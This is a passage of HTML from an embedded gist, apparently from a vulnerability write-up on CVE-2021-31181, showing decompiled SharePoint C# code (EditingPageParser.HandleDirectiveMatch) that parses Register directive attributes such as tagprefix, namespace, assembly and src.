          <td id="file-cve-2021-31181-snippet-3-cs-LC21" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC22" class="blob-code blob-code-inner js-file-line">                <span class="pl-s1">EditingPageParser</span><span class="pl-kos">.</span><span class="pl-en">HandleDirectiveMatch</span><span class="pl-kos">(</span><span class="pl-s1">match</span><span class="pl-kos">,</span> <span class="pl-s1">typeNames</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC23" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">goto</span> <span class="pl-s1">IL_127</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC24" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC25" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">catch</span> <span class="pl-kos">(</span><span class="pl-s1">System</span><span class="pl-kos">.</span><span class="pl-s1">Exception</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC26" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// … </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// Microsoft.SharePoint.EditingPageParser </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC28" class="blob-code blob-code-inner js-file-line">private <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">void</span> <span class="pl-en">HandleDirectiveMatch</span><span class="pl-kos">(</span><span class="pl-smi">Match</span> <span class="pl-s1">match</span><span class="pl-kos">,</span> <span class="pl-smi">Hashtable</span> <span class="pl-s1">typeNames</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC29" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">CaptureCollection</span> <span class="pl-s1">captures</span> <span class="pl-c1">=</span> <span class="pl-s1">match</span><span class="pl-kos">.</span><span class="pl-s1">Groups</span><span class="pl-kos">[</span><span class="pl-s">"attrname"</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-s1">Captures</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC31" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">CaptureCollection</span> <span class="pl-s1">captures2</span> <span class="pl-c1">=</span> <span class="pl-s1">match</span><span class="pl-kos">.</span><span class="pl-s1">Groups</span><span class="pl-kos">[</span><span class="pl-s">"attrval"</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-s1">Captures</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">text</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC33" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">text2</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC34" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">text3</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC35" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">text4</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC36" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">string</span> <span class="pl-s1">text5</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC37" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> <span class="pl-kos">(</span><span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span><span class="pl-kos">;</span> <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">captures</span><span class="pl-kos">.</span><span class="pl-s1">Count</span><span class="pl-kos">;</span> <span class="pl-s1">i</span><span class="pl-c1">++</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC38" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC39" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">strA</span> <span class="pl-c1">=</span> <span class="pl-s1">captures</span><span class="pl-kos">[</span><span class="pl-s1">i</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-en">ToString</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L40" class="blob-num js-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC40" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">text6</span> <span class="pl-c1">=</span> <span class="pl-s1">captures2</span><span class="pl-kos">[</span><span class="pl-s1">i</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-en">ToString</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L41" class="blob-num js-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC41" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">Compare</span><span class="pl-kos">(</span><span class="pl-s1">strA</span><span class="pl-kos">,</span> <span class="pl-s">"tagprefix"</span><span class="pl-kos">,</span> <span class="pl-s1">StringComparison</span><span class="pl-kos">.</span><span class="pl-s1">OrdinalIgnoreCase</span><span class="pl-kos">)</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L42" class="blob-num js-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC42" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L43" class="blob-num js-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC43" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">text</span> <span class="pl-c1">=</span> <span class="pl-s1">text6</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L44" class="blob-num js-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC44" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">IsNullOrEmpty</span><span class="pl-kos">(</span><span class="pl-s1">text</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L45" class="blob-num js-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC45" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L46" class="blob-num js-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC46" class="blob-code blob-code-inner js-file-line">                <span class="pl-s1">text</span> <span class="pl-c1">=</span> <span class="pl-s1">text</span><span class="pl-kos">.</span><span class="pl-en">ToLower</span><span class="pl-kos">(</span><span class="pl-s1">CultureInfo</span><span class="pl-kos">.</span><span class="pl-s1">InvariantCulture</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L47" class="blob-num js-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC47" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L48" class="blob-num js-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC48" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L49" class="blob-num js-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC49" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">Compare</span><span class="pl-kos">(</span><span class="pl-s1">strA</span><span class="pl-kos">,</span> <span class="pl-s">"namespace"</span><span class="pl-kos">,</span> <span class="pl-s1">StringComparison</span><span class="pl-kos">.</span><span class="pl-s1">OrdinalIgnoreCase</span><span class="pl-kos">)</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L50" class="blob-num js-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC50" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L51" class="blob-num js-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC51" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">text2</span> <span class="pl-c1">=</span> <span class="pl-s1">text6</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L52" class="blob-num js-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC52" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L53" class="blob-num js-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC53" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">Compare</span><span class="pl-kos">(</span><span class="pl-s1">strA</span><span class="pl-kos">,</span> <span class="pl-s">"assembly"</span><span class="pl-kos">,</span> <span class="pl-s1">StringComparison</span><span class="pl-kos">.</span><span class="pl-s1">OrdinalIgnoreCase</span><span class="pl-kos">)</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L54" class="blob-num js-line-number js-blob-rnum" data-line-number="54"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC54" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L55" class="blob-num js-line-number js-blob-rnum" data-line-number="55"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC55" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">text3</span> <span class="pl-c1">=</span> <span class="pl-s1">text6</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L56" class="blob-num js-line-number js-blob-rnum" data-line-number="56"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC56" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L57" class="blob-num js-line-number js-blob-rnum" data-line-number="57"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC57" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">Compare</span><span class="pl-kos">(</span><span class="pl-s1">strA</span><span class="pl-kos">,</span> <span class="pl-s">"tagname"</span><span class="pl-kos">,</span> <span class="pl-s1">StringComparison</span><span class="pl-kos">.</span><span class="pl-s1">OrdinalIgnoreCase</span><span class="pl-kos">)</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L58" class="blob-num js-line-number js-blob-rnum" data-line-number="58"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC58" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L59" class="blob-num js-line-number js-blob-rnum" data-line-number="59"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC59" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">text4</span> <span class="pl-c1">=</span> <span class="pl-s1">text6</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L60" class="blob-num js-line-number js-blob-rnum" data-line-number="60"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC60" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L61" class="blob-num js-line-number js-blob-rnum" data-line-number="61"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC61" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span> <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">Compare</span><span class="pl-kos">(</span><span class="pl-s1">strA</span><span class="pl-kos">,</span> <span class="pl-s">"src"</span><span class="pl-kos">,</span> <span class="pl-s1">StringComparison</span><span class="pl-kos">.</span><span class="pl-s1">OrdinalIgnoreCase</span><span class="pl-kos">)</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L62" class="blob-num js-line-number js-blob-rnum" data-line-number="62"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC62" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L63" class="blob-num js-line-number js-blob-rnum" data-line-number="63"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC63" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">text5</span> <span class="pl-c1">=</span> <span class="pl-s1">text6</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L64" class="blob-num js-line-number js-blob-rnum" data-line-number="64"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC64" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L65" class="blob-num js-line-number js-blob-rnum" data-line-number="65"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC65" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L66" class="blob-num js-line-number js-blob-rnum" data-line-number="66"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC66" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">IsNullOrEmpty</span><span class="pl-kos">(</span><span class="pl-s1">text</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L67" class="blob-num js-line-number js-blob-rnum" data-line-number="67"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC67" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L68" class="blob-num js-line-number js-blob-rnum" data-line-number="68"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC68" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L69" class="blob-num js-line-number js-blob-rnum" data-line-number="69"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC69" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L70" class="blob-num js-line-number js-blob-rnum" data-line-number="70"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC70" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">IsNullOrEmpty</span><span class="pl-kos">(</span><span class="pl-s1">text3</span><span class="pl-kos">)</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-c1">!</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">IsNullOrEmpty</span><span class="pl-kos">(</span><span class="pl-s1">text2</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L71" class="blob-num js-line-number js-blob-rnum" data-line-number="71"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC71" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L72" class="blob-num js-line-number js-blob-rnum" data-line-number="72"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC72" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-s1">typeNames</span><span class="pl-kos">.</span><span class="pl-en">ContainsKey</span><span class="pl-kos">(</span><span class="pl-s1">text</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L73" class="blob-num js-line-number js-blob-rnum" data-line-number="73"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC73" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L74" class="blob-num js-line-number js-blob-rnum" data-line-number="74"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC74" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">typeNames</span><span class="pl-kos">[</span><span class="pl-s1">text</span><span class="pl-kos">]</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">ArrayList</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L75" class="blob-num js-line-number js-blob-rnum" data-line-number="75"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC75" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L76" class="blob-num js-line-number js-blob-rnum" data-line-number="76"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC76" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">ArrayList</span> <span class="pl-s1">arrayList</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">ArrayList</span><span class="pl-kos">)</span><span class="pl-s1">typeNames</span><span class="pl-kos">[</span><span class="pl-s1">text</span><span class="pl-kos">]</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L77" class="blob-num js-line-number js-blob-rnum" data-line-number="77"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC77" class="blob-code blob-code-inner js-file-line">        <span class="pl-s1">arrayList</span><span class="pl-kos">.</span><span class="pl-en">Add</span><span class="pl-kos">(</span><span class="pl-k">new</span> <span class="pl-smi">Triplet</span><span class="pl-kos">(</span><span class="pl-s1">text2</span><span class="pl-kos">,</span> <span class="pl-s1">text3</span><span class="pl-kos">,</span> <span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-s1">Empty</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L78" class="blob-num js-line-number js-blob-rnum" data-line-number="78"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC78" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L79" class="blob-num js-line-number js-blob-rnum" data-line-number="79"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC79" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L80" class="blob-num js-line-number js-blob-rnum" data-line-number="80"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC80" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">IsNullOrEmpty</span><span class="pl-kos">(</span><span class="pl-s1">text4</span><span class="pl-kos">)</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-c1">!</span><span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-en">IsNullOrEmpty</span><span class="pl-kos">(</span><span class="pl-s1">text5</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L81" class="blob-num js-line-number js-blob-rnum" data-line-number="81"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC81" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L82" class="blob-num js-line-number js-blob-rnum" data-line-number="82"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC82" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-s1">typeNames</span><span class="pl-kos">.</span><span class="pl-en">ContainsKey</span><span class="pl-kos">(</span><span class="pl-s1">text</span><span class="pl-kos">)</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L83" class="blob-num js-line-number js-blob-rnum" data-line-number="83"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC83" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L84" class="blob-num js-line-number js-blob-rnum" data-line-number="84"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC84" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">typeNames</span><span class="pl-kos">[</span><span class="pl-s1">text</span><span class="pl-kos">]</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">ArrayList</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L85" class="blob-num js-line-number js-blob-rnum" data-line-number="85"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC85" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L86" class="blob-num js-line-number js-blob-rnum" data-line-number="86"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC86" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">ArrayList</span> <span class="pl-s1">arrayList2</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">ArrayList</span><span class="pl-kos">)</span><span class="pl-s1">typeNames</span><span class="pl-kos">[</span><span class="pl-s1">text</span><span class="pl-kos">]</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L87" class="blob-num js-line-number js-blob-rnum" data-line-number="87"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC87" class="blob-code blob-code-inner js-file-line">        <span class="pl-s1">arrayList2</span><span class="pl-kos">.</span><span class="pl-en">Add</span><span class="pl-kos">(</span><span class="pl-k">new</span> <span class="pl-smi">Triplet</span><span class="pl-kos">(</span><span class="pl-s1">text4</span><span class="pl-kos">,</span> <span class="pl-smi">string</span><span class="pl-kos">.</span><span class="pl-s1">Empty</span><span class="pl-kos">,</span> <span class="pl-s1">text5</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L88" class="blob-num js-line-number js-blob-rnum" data-line-number="88"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC88" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-3-cs-L89" class="blob-num js-line-number js-blob-rnum" data-line-number="89"></td>
          <td id="file-cve-2021-31181-snippet-3-cs-LC89" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">}</span></td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/76530cf7c3c564be77611553b099f84c/raw/d8e5b09f662fb0abfa491ad892262002d01bfee0/CVE-2021-31181-snippet-3.cs" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/76530cf7c3c564be77611553b099f84c#file-cve-2021-31181-snippet-3-cs" class="Link--inTextBlock">
          CVE-2021-31181-snippet-3.cs
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_35369"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
